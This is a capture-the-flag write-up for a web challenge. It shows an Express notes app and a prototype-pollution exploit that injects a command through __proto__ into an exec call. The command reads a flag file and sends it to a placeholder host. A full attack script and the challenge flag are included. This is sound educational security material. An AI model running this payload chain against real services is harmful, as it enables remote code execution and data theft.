# secure-notekeeper Challenge Writeup

> **Category**: Web\
> **Author**: Stefan

## TL;DR
Exploiting prototype pollution to execute arbitrary commands.

---

## Challenge Description
The challenge involves a web application that allows us to add objects to a database. Our goal is to exploit the application to retrieve the flag.

## Solution

### Step 1: Analyzing the Application
First, we analyze the application by inspecting the source code. The application uses Express and has endpoints for adding and retrieving "notes".

```js
const express = require('express');
const bodyParser = require("body-parser");
const router = express.Router()
const { exec } = require("child_process");
const app = express();

app.use(bodyParser.urlencoded({extended: false}));
app.use(bodyParser.json());

app.use("/",router);

let db = {};

router.get('/',(req,res) => {
	res.send("Welcome to secure_notekeeper!");
});

router.get('/get_items',(req,res) =>{
    const {user,password} = req.query;
	if (!user) return res.send("Invalid use of the endpoint. No user provided!");
	var result = db[user];
	if (result) result = result[password];
	res.send(result);
});

router.get('/add', (req, res) => {
	const {user,password,entry} = req.query;
	if (!user) return res.send("Invalid use of the endpoint. No user provided!");
	if (!db[user]) db[user]={};
	db[user][password] = entry;
	res.send("Entry added succesfully!");
});
```

### Step 2: Identifying the Vulnerability
Upon inspecting the code, we notice that the application is vulnerable to prototype pollution. The `db` object is used to store user data, and there are no checks to prevent prototype pollution.

### Step 3: Exploiting Prototype Pollution
We can exploit prototype pollution by adding properties to the `db` object that will allow us to execute arbitrary commands. The `dev` endpoint in the code uses the `exec` function to execute commands, which we can leverage to read the flag.

```js
router.get('/dev',(req,res) => {
	let result = Buffer.from(JSON.stringify(db));
	const cmd = utils.uploader + `dev ${result.toString('base64')}`;
	console.log(cmd);
	exec(cmd,(err,_,__) => {
		if (err) return res.json({is_success:false});
		res.json({is_success:true});
	});
});
```

### Step 4: Crafting the Payload
We craft a payload to pollute the prototype and add a command to read the flag file. We use the `add` endpoint to inject our payload.

```http://34.107.71.117:31412/add?user=__proto__&password=uploader&entry=node%20%2De%20%22const%20%7B%20exec%20%7D%20%3D%20require%28%27child%5Fprocess%27%29%3B%20exec%28%27cat%20%2Fhome%2Fnotekeeper%2Fflag%2Etxt%27%2C%20%28err%2C%20stdout%2C%20stderr%29%20%3D%3E%20%7B%20if%20%28err%29%20%7B%20console%2Eerror%28err%29%3B%20return%3B%20%7D%20fetch%28%27http%3A%2F%2Fyour%5Fip%3Ayour%5Fport%2F%3Foutput%3D%27%20%2B%20encodeURIComponent%28stdout%29%29%2Ecatch%28console%2Eerror%29%3B%20%7D%29%3B%22%20%23%20```

> **Note**: Prototype pollution is a vulnerability where an attacker can modify the prototype of a base object, affecting all instances of that object. In the provided code, the `/add` endpoint allows users to add entries to the `db` object without proper validation, making it vulnerable. By setting the `user` parameter to `__proto__`, we can modify the prototype of all objects, basically modify what an object is itself. This allows us to add properties that will be inherited by other objects, such as `utils`. We can then exploit this by injecting a command into the `uploader` property of the prototype. When the `/dev` endpoint is triggered, it uses the `uploader` property to execute commands, allowing us to read the flag file and retrieve its content.

### Step 5: Executing the Payload
After injecting the payload, we trigger the `dev` endpoint to execute our command and retrieve the flag.

```http://34.107.71.117:31412/dev```

### Step 6: Retrieving the Flag
The command reads the flag file and sends the content to our server. We capture the flag from the response.

The JS payload URL decoded is:

```node -e "const { exec } = require('child_process'); exec('cat /home/notekeeper/flag.txt', (err, stdout, stderr) => { if (err) { console.error(err); return; } fetch('http://your_ip:your_port/?output=' + encodeURIComponent(stdout)).catch(console.error); });" #```

> **Note**: I added a `#` at the end of the payload to mark the rest of the command as a comment. ```const cmd = utils.uploader + `dev ${result.toString('base64')}`;```

## Script
```js
const payload = `
node%20%2De%20%22const%20%7B%20exec%20%7D%20%3D%20require%28%27child%5Fprocess%27%29%3B%20exec%28%27cat%20%2Fhome%2Fnotekeeper%2Fflag%2Etxt%27%2C%20%28err%2C%20stdout%2C%20stderr%29%20%3D%3E%20%7B%20if%20%28err%29%20%7B%20console%2Eerror%28err%29%3B%20return%3B%20%7D%20fetch%28%27http%3A%2F%2Fyour%5Fip%3Ayour%5Fport%2F%3Foutput%3D%27%20%2B%20encodeURIComponent%28stdout%29%29%2Ecatch%28console%2Eerror%29%3B%20%7D%29%3B%22%20%23%20`

fetch(`http://34.107.71.117:31412/add?user=__proto__&password=uploader&entry=${payload}`)
    .then(response => response.text())
    .then(data => {
        fetch('http://34.107.71.117:31412/dev')
            .then(response => response.text())
            .then(data => {
                console.log(data);
            })
            .catch(error => {
                console.error(error);
            });
    })
    .catch(error => {
        console.error(error);
    });
```
## Flag
`ctf{d3147872085df5640daf51b2781a45d34645226fdf37367fa04fecb6242ea83b}`